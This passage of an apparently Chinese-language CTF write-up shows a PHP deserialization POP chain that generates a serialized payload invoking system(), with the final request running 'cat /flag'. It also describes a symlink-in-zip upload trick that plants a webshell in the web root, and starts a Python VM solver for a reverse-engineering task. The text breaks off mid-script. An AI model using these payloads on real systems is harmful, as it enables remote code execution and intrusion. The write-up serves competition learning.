&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; <span class="comment">// 触发 __get()</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">try</span> &#123; <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile); &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123; <span class="keyword">return</span> <span class="string">&quot;TypeError&quot;</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); <span class="comment">// 调用 system/passthru 等</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ================== 构造链条 ================== */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最内层：ContentProcessor</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$C</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 也可换成 passthru/exec/shell_exec</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间层：FileManager</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$B</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$C</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$B</span>-&gt;responseData = <span class="string">&#x27;READY&#x27;</span>; <span class="comment">// 避免 &quot;default_response&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 外层：FileManager</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$B</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成序列化 payload</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Raw:\n<span class="subst">$payload</span>\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL-encoded:\n&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行生成payload</p><p><img src="/2025/08/23/JGCTF-8-WP/image6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A5%3A%22READY%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D</span><br></pre></td></tr></table></figure><p>然后加上参数</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A5%3A%22READY%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&amp;submit_md5=&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image7.png"></p><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>打开环境就一个文件上传</p><p>没回显，没有任何思路</p><p>于是尝试去搜索</p><p>找到相关文章</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/17439035.html">https://www.cnblogs.com/gxngxngxn/p/17439035.html</a></p><p>于是进行构造软连接</p><p>那么方向就很明显了，我们可以先上传一个带有软连接的压缩包，这个软连接指向网站的根目录，即&#x2F;var&#x2F;www&#x2F;html,然后我们再上传一个带有马的文件的压缩包，就可以将这个带马文件压缩到网站的根目录下，我们也可以直接访问这个带马文件了</p><p><img src="/2025/08/23/JGCTF-8-WP/image8.png"></p><p>然后删除link（防止与文件夹重名）这个文件，创建一个名为link的文件夹，然后在这个文件夹下写入带马的Php文件(因为之前我们软连接的文件叫做link，所以我们要让这个压缩在这个文件夹下面):</p><p><img src="/2025/08/23/JGCTF-8-WP/image9.png"></p><p>那么现在完事具备了，只欠上传捏</p><p>先上传link.zip,然后再上传link1.zip</p><p>然后去访问&#x2F;shell.php</p><p><img src="/2025/08/23/JGCTF-8-WP/image10.png"></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Checkit"><a href="#Checkit" class="headerlink" title="Checkit"></a>Checkit</h2><p>下载附件</p><p><img src="/2025/08/23/JGCTF-8-WP/image11.png"></p><p>去ida调试so层找check方法</p><p>Java_com_test_ezre_MainActivity_checkInput</p><p><img src="/2025/08/23/JGCTF-8-WP/image12.png"></p><p>拿到code的值</p><p><img src="/2025/08/23/JGCTF-8-WP/image13.png"></p><p>去掉多余的空字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code = [0x34,0x2E,0x2B,0x2E,0x19,0x2C,0x29,0x2D,0x2E,0x4E,0x22,0x27,0x2E,0x53,0x2D,0x28,0x23,0x2D,0x2E,0x53,0x26,0x27,0x2F,0x31,0x2B,0x2E,0x43,0x2D,0x29,0x26,0x2D,0x2E,0x54,0x22,0x27,0x2E,0x46,0x2D,0x28,0x23,0x27,0x2F,0x31,0x2B,0x32,0x26,0x2E,0x31,0x2B,0x2E,0x32,0x2C,0x30,0x2D,0x28,0x33,0x32,0x04,0xFF]</span><br></pre></td></tr></table></figure><p>继续追看exec具体怎么实现的</p><p><img src="/2025/08/23/JGCTF-8-WP/image14.png"></p><p>头大</p><p>丢ai分析</p><p>VM 指令流</p><p>继续拿</p><p><img src="/2025/08/23/JGCTF-8-WP/image15.png"></p><p><img src="/2025/08/23/JGCTF-8-WP/image16.png"></p><p>给ai写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">自动从 VM 中恢复 flag 的完整解密脚本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">保存为 solve_vm.py 后运行： python3 solve_vm.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从你提供的反汇编直接提取的单字节指令流（每个 db 的第一个字节）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># （如果你的二进制里 code 提取方式不同，按需调整）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line">CODE = [</span><br><span class="line"></span><br><span class="line">  <span class="number">0x34</span>,<span class="number">0x2E</span>,<span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x19</span>,<span class="number">0x2C</span>,<span class="number">0x29</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x4E</span>,<span class="number">0x22</span>,<span class="number">0x27</span>,<span class="number">0x2E</span>,<span class="number">0x53</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x23</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x53</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x43</span>,<span class="number">0x2D</span>,<span class="number">0x29</span>,<span class="number">0x26</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x54</span>,<span class="number">0x22</span>,<span class="number">0x27</span>,<span class="number">0x2E</span>,<span class="number">0x46</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,<span class="number">0x23</span>,<span class="number">0x27</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2B</span>,<span class="number">0x32</span>,<span class="number">0x26</span>,<span class="number">0x2E</span>,<span class="number">0x31</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x2B</span>,<span class="number">0x2E</span>,<span class="number">0x32</span>,<span class="number">0x2C</span>,<span class="number">0x30</span>,<span class="number">0x2D</span>,<span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x04</span>,<span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备注：这个 CODE 列表来源于你贴出的 db 序列（只取每条 db 的首字节，忽略额外填充 0）</span></span><br><span class="line"></span><br><span class="line">CMP_DATA = [</span><br><span class="line"></span><br><span class="line">  <span class="number">0x1A</span>,<span class="number">0x1E</span>,<span class="number">0x1D</span>,<span class="number">0x0E</span>,<span class="number">0x1C</span>,<span class="number">0x13</span>,<span class="number">0x25</span>,<span class="number">0x0E</span>,<span class="number">0x78</span>,<span class="number">0x3B</span>,<span class="number">0x31</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x3F</span>,<span class="number">0x68</span>,<span class="number">0x45</span>,<span class="number">0x23</span>,<span class="number">0x3D</span>,<span class="number">0x0F</span>,<span class="number">0x45</span>,<span class="number">0x37</span>,<span class="number">0x3A</span>,<span class="number">0x3A</span>,<span class="number">0x70</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x07</span>,<span class="number">0x81</span>,<span class="number">0x1A</span>,<span class="number">0x2A</span>,<span class="number">0x3D</span>,<span class="number">0x7E</span>,<span class="number">0x7D</span>,<span class="number">0x3C</span>,<span class="number">0x09</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x2A</span>,<span class="number">0x0E</span>,<span class="number">0x7E</span>,<span class="number">0x09</span>,<span class="number">0x32</span>,<span class="number">0x19</span>,<span class="number">0x81</span>,<span class="number">0x0C</span>,<span class="number">0x2A</span>,<span class="number">0x68</span>,<span class="number">0x45</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">0x09</span>,<span class="number">0x43</span>,<span class="number">0x3B</span>,<span class="number">0x70</span>,<span class="number">0x4F</span>,<span class="number">0x4C</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里 CMP_DATA 含 48 个有效字节（与你提供的数据一致）。若真实二进制更长可补齐。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VM 实现（忠实于你反汇编的 exec）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VM</span>:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, code: <span class="type">List</span>[<span class="built_in">int</span>], cmp_data: <span class="type">List</span>[<span class="built_in">int</span>], mem: <span class="built_in">bytes</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.code = code[:]    <span class="comment"># 指令流（每项 0..255）</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.cmp_data = cmp_data[:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 模拟 a2 的结构：</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.acc = <span class="number">0</span>      <span class="comment"># a2[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.idx = <span class="number">0</span>      <span class="comment"># a2[1] (byte)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.pc = <span class="number">0</span>      <span class="comment"># *((int*)a2 + 2)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.sp = <span class="number">0</span>      <span class="comment"># stack pointer</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.reg3 = <span class="number">0</span>     <span class="comment"># a2[3]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.counter = <span class="number">0</span>    <span class="comment"># *((int*)a2 + 4)</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.errflag = <span class="number">0</span>    <span class="comment"># a2[4]</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.stack = []</span><br><span class="line">    </span><br><span 